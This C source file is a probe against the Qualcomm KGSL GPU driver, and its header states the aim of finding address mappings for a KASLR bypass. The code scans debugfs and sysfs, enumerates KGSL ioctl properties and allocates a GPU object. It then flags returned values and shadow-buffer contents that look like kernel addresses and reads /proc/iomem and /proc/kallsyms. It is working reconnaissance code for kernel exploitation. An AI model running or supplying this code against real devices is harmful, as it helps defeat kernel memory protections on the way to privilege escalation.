/*
 * kgsl_debug_probe.c - KGSL Debug Information Probe
 *
 * Attempts to extract kernel structure information from:
 * - /sys/kernel/debug/kgsl (if accessible)
 * - /sys/class/kgsl/kgsl-3d0
 * - /proc/kgsl (if exists)
 * - GPU property queries via IOCTL
 *
 * Goal: Find physical-to-virtual address mappings for KASLR bypass
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>

/* KGSL IOCTL Definitions */
#define KGSL_IOC_TYPE 0x09

struct kgsl_device_getproperty
{
    unsigned int type;
    void *value;
    size_t sizebytes;
};

struct kgsl_gpuobj_alloc
{
    uint64_t size;
    uint64_t flags;
    uint64_t va_len;
    uint64_t mmapaddr;
    uint64_t id;
    uint64_t metadata_len;
    uint64_t metadata;
};

struct kgsl_gpuobj_info
{
    uint64_t gpuaddr;
    uint64_t flags;
    uint64_t size;
    uint64_t va_len;
    uint64_t va_addr;
    uint64_t id;
};

#define IOCTL_KGSL_DEVICE_GETPROPERTY \
    _IOWR(KGSL_IOC_TYPE, 0x02, struct kgsl_device_getproperty)
#define IOCTL_KGSL_GPUOBJ_ALLOC \
    _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_INFO \
    _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

/* Property types (from kgsl.h) */
enum kgsl_property_type
{
    KGSL_PROP_DEVICE_INFO = 0x1,
    KGSL_PROP_DEVICE_SHADOW = 0x2,
    KGSL_PROP_DEVICE_POWER = 0x3,
    KGSL_PROP_SHMEM = 0x4,
    KGSL_PROP_SHMEM_APERTURES = 0x5,
    KGSL_PROP_MMU_ENABLE = 0x6,
    KGSL_PROP_INTERRUPT_WAITS = 0x7,
    KGSL_PROP_VERSION = 0x8,
    KGSL_PROP_GPU_RESET_STAT = 0x9,
    KGSL_PROP_PWRCTRL = 0xa,
    KGSL_PROP_PWR_CONSTRAINT = 0xb,
    KGSL_PROP_UCHE_GMEM_VADDR = 0xc,
    KGSL_PROP_SP_GENERIC_MEM = 0xd,
    KGSL_PROP_UCODE_VERSION = 0xe,
    KGSL_PROP_GPMU_VERSION = 0xf,
    KGSL_PROP_HIGHEST_BANK_BIT = 0x10,
    KGSL_PROP_DEVICE_BITNESS = 0x11,
    KGSL_PROP_DEVICE_QTIMER = 0x12,
    KGSL_PROP_SECURE_BUFFER_ALIGNMENT = 0x13,
    KGSL_PROP_SECURE_CTXT_SUPPORT = 0x14,
    KGSL_PROP_SPEED_BIN = 0x15,
    KGSL_PROP_GAMING_BIN = 0x16,
    KGSL_PROP_GPU_MODEL = 0x17,
    KGSL_PROP_VK_DEVICE_ID = 0x18,
    KGSL_PROP_CHIPID = 0x19,
    KGSL_PROP_QUERY_CAPS = 0x1a,
};

const char *property_names[] = {
    "INVALID",
    "DEVICE_INFO",
    "DEVICE_SHADOW",
    "DEVICE_POWER",
    "SHMEM",
    "SHMEM_APERTURES",
    "MMU_ENABLE",
    "INTERRUPT_WAITS",
    "VERSION",
    "GPU_RESET_STAT",
    "PWRCTRL",
    "PWR_CONSTRAINT",
    "UCHE_GMEM_VADDR",
    "SP_GENERIC_MEM",
    "UCODE_VERSION",
    "GPMU_VERSION",
    "HIGHEST_BANK_BIT",
    "DEVICE_BITNESS",
    "DEVICE_QTIMER",
    "SECURE_BUFFER_ALIGNMENT",
    "SECURE_CTXT_SUPPORT",
    "SPEED_BIN",
    "GAMING_BIN",
    "GPU_MODEL",
    "VK_DEVICE_ID",
    "CHIPID",
    "QUERY_CAPS",
};

/* Read file content */
int read_file_content(const char *path, char *buf, size_t len)
{
    int fd = open(path, O_RDONLY);
    if (fd < 0)
        return -1;

    ssize_t n = read(fd, buf, len - 1);
    close(fd);

    if (n < 0)
        return -1;
    buf[n] = '\0';

    /* Remove trailing newline */
    while (n > 0 && buf[n - 1] == '\n')
        buf[--n] = '\0';

    return n;
}

/* Scan a directory recursively */
void scan_directory(const char *path, int depth)
{
    if (depth > 5)
        return;

    DIR *dir = opendir(path);
    if (!dir)
    {
        printf("  %*s[-] %s: %s\n", depth * 2, "", path, strerror(errno));
        return;
    }

    struct dirent *ent;
    while ((ent = readdir(dir)) != NULL)
    {
        if (ent->d_name[0] == '.')
            continue;

        char full_path[1024];
        snprintf(full_path, sizeof(full_path), "%s/%s", path, ent->d_name);

        struct stat st;
        if (stat(full_path, &st) < 0)
            continue;

        if (S_ISDIR(st.st_mode))
        {
            printf("  %*s[DIR] %s/\n", depth * 2, "", ent->d_name);
            scan_directory(full_path, depth + 1);
        }
        else if (S_ISREG(st.st_mode))
        {
            char content[256];
            if (read_file_content(full_path, content, sizeof(content)) > 0)
            {
                printf("  %*s%s = %s\n", depth * 2, "", ent->d_name, content);
            }
            else
            {
                printf("  %*s%s: (unreadable)\n", depth * 2, "", ent->d_name);
            }
        }
    }

    closedir(dir);
}

/* Query KGSL properties */
void probe_kgsl_properties(int fd)
{
    printf("\n=== KGSL Device Properties ===\n");

    uint8_t buffer[256];

    for (int i = 1; i <= 26; i++)
    {
        memset(buffer, 0, sizeof(buffer));

        struct kgsl_device_getproperty prop = {
            .type = i,
            .value = buffer,
            .sizebytes = sizeof(buffer),
        };

        if (ioctl(fd, IOCTL_KGSL_DEVICE_GETPROPERTY, &prop) == 0)
        {
            printf("[+] Property %d (%s):\n", i,
                   i < 27 ? property_names[i] : "UNKNOWN");

            /* Print as hex */
            printf("    Hex: ");
            for (int j = 0; j < 32 && j < sizeof(buffer); j++)
            {
                printf("%02x ", buffer[j]);
            }
            printf("\n");

            /* Try to interpret as uint64 values */
            uint64_t *vals = (uint64_t *)buffer;
            if (vals[0] != 0)
            {
                printf("    u64[0] = 0x%016llx\n", (unsigned long long)vals[0]);
            }
            if (vals[1] != 0)
            {
                printf("    u64[1] = 0x%016llx\n", (unsigned long long)vals[1]);
            }
            if (vals[2] != 0)
            {
                printf("    u64[2] = 0x%016llx\n", (unsigned long long)vals[2]);
            }
        }
        else
        {
            printf("[-] Property %d (%s): %s\n", i,
                   i < 27 ? property_names[i] : "UNKNOWN",
                   strerror(errno));
        }
    }
}

/* Query GPU object info */
void probe_gpuobj_info(int fd)
{
    printf("\n=== GPU Object Info Query ===\n");

    /* First allocate a buffer to get valid id */
    struct kgsl_gpuobj_alloc alloc = {
        .size = 0x1000,
        .flags = 0x00100000,
    };

    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) < 0)
    {
        printf("[-] Cannot allocate test object: %s\n", strerror(errno));
        return;
    }

    printf("[+] Allocated test object: id=%llu, mmapaddr=0x%llx\n",
           (unsigned long long)alloc.id,
           (unsigned long long)alloc.mmapaddr);

    /* Query info */
    struct kgsl_gpuobj_info info = {
        .id = alloc.id,
    };

    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info) == 0)
    {
        printf("[+] GPUOBJ_INFO:\n");
        printf("    gpuaddr  = 0x%016llx\n", (unsigned long long)info.gpuaddr);
        printf("    flags    = 0x%016llx\n", (unsigned long long)info.flags);
        printf("    size     = 0x%llx\n", (unsigned long long)info.size);
        printf("    va_len   = 0x%llx\n", (unsigned long long)info.va_len);
        printf("    va_addr  = 0x%016llx\n", (unsigned long long)info.va_addr);
        printf("    id       = %llu\n", (unsigned long long)info.id);

        /* Check if any of these look like kernel addresses */
        if ((info.gpuaddr >> 48) == 0xFFFF)
        {
            printf("    [!] gpuaddr looks like kernel address!\n");
        }
        if ((info.va_addr >> 48) == 0xFFFF)
        {
            printf("    [!] va_addr looks like kernel address!\n");
        }
    }
    else
    {
        printf("[-] GPUOBJ_INFO failed: %s\n", strerror(errno));
    }
}

/* Check for KGSL memory maps in /proc/self/maps */
void probe_proc_maps(void)
{
    printf("\n=== KGSL Mappings in /proc/self/maps ===\n");

    FILE *f = fopen("/proc/self/maps", "r");
    if (!f)
        return;

    char line[512];
    while (fgets(line, sizeof(line), f))
    {
        if (strstr(line, "kgsl") || strstr(line, "gpu"))
        {
            printf("  %s", line);
        }
    }

    fclose(f);
}

/* Try to access ion/dma-buf info */
void probe_ion_dmabuf(void)
{
    printf("\n=== ION/DMA-BUF Probe ===\n");

    const char *ion_paths[] = {
        "/dev/ion",
        "/dev/dma_heap/system",
        "/dev/dma_heap/system-uncached",
        "/sys/kernel/debug/ion",
        "/sys/kernel/debug/dma_buf",
        NULL};

    for (int i = 0; ion_paths[i]; i++)
    {
        struct stat st;
        if (stat(ion_paths[i], &st) == 0)
        {
            printf("[+] Found: %s (mode=%o)\n", ion_paths[i], st.st_mode & 0777);

            if (S_ISDIR(st.st_mode))
            {
                scan_directory(ion_paths[i], 1);
            }
        }
        else
        {
            printf("[-] %s: %s\n", ion_paths[i], strerror(errno));
        }
    }
}

/* Try to find memory regions info */
void probe_memory_info(void)
{
    printf("\n=== Kernel Memory Info ===\n");

    /* /proc/iomem - requires root usually */
    char buf[4096];
    if (read_file_content("/proc/iomem", buf, sizeof(buf)) > 0)
    {
        printf("[+] /proc/iomem (first 2KB):\n%s\n", buf);
    }
    else
    {
        printf("[-] /proc/iomem: %s\n", strerror(errno));
    }

    /* Try kallsyms */
    FILE *f = fopen("/proc/kallsyms", "r");
    if (f)
    {
        char line[256];
        int count = 0;
        printf("[+] /proc/kallsyms (KGSL related, first 20):\n");

        while (fgets(line, sizeof(line), f) && count < 20)
        {
            if (strstr(line, "kgsl"))
            {
                printf("  %s", line);
                count++;
            }
        }

        if (count == 0)
        {
            printf("  (No KGSL symbols found or addresses hidden)\n");
        }

        fclose(f);
    }
    else
    {
        printf("[-] /proc/kallsyms: %s\n", strerror(errno));
    }
}

/* GPU shadow buffer analysis */
void probe_gpu_shadow(int fd)
{
    printf("\n=== GPU Shadow Buffer Analysis ===\n");

    uint8_t buffer[256];
    memset(buffer, 0, sizeof(buffer));

    struct kgsl_device_getproperty prop = {
        .type = KGSL_PROP_DEVICE_SHADOW,
        .value = buffer,
        .sizebytes = sizeof(buffer),
    };

    if (ioctl(fd, IOCTL_KGSL_DEVICE_GETPROPERTY, &prop) < 0)
    {
        printf("[-] Cannot get shadow property: %s\n", strerror(errno));
        return;
    }

    /* Shadow buffer contains GPU state */
    uint32_t *shadow = (uint32_t *)buffer;
    uint64_t *shadow64 = (uint64_t *)buffer;

    printf("[+] Shadow buffer (first 64 bytes):\n");
    for (int i = 0; i < 16; i++)
    {
        printf("  [%02d] 0x%08x", i, shadow[i]);
        if ((shadow[i] >> 24) == 0xFF || (shadow64[i / 2] >> 48) == 0xFFFF)
        {
            printf(" <-- possible kernel data");
        }
        printf("\n");
    }
}

int main(void)
{
    printf("=== KGSL Debug Information Probe ===\n\n");

    /* Check debugfs */
    printf("=== DebugFS KGSL ===\n");
    scan_directory("/sys/kernel/debug/kgsl", 0);

    /* Check sysfs */
    printf("\n=== SysFS KGSL ===\n");
    scan_directory("/sys/class/kgsl", 0);

    /* Check DRM */
    printf("\n=== SysFS DRM ===\n");
    scan_directory("/sys/class/drm", 0);

    /* Open KGSL */
    int kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0)
    {
        printf("[-] Cannot open KGSL: %s\n", strerror(errno));
        return 1;
    }

    /* Probe via IOCTL */
    probe_kgsl_properties(kgsl_fd);
    probe_gpuobj_info(kgsl_fd);
    probe_gpu_shadow(kgsl_fd);

    /* Check process maps */
    probe_proc_maps();

    /* Check ION/DMA-BUF */
    probe_ion_dmabuf();

    /* Check kernel memory */
    probe_memory_info();

    close(kgsl_fd);

    printf("\n=== Done ===\n");
    return 0;
}
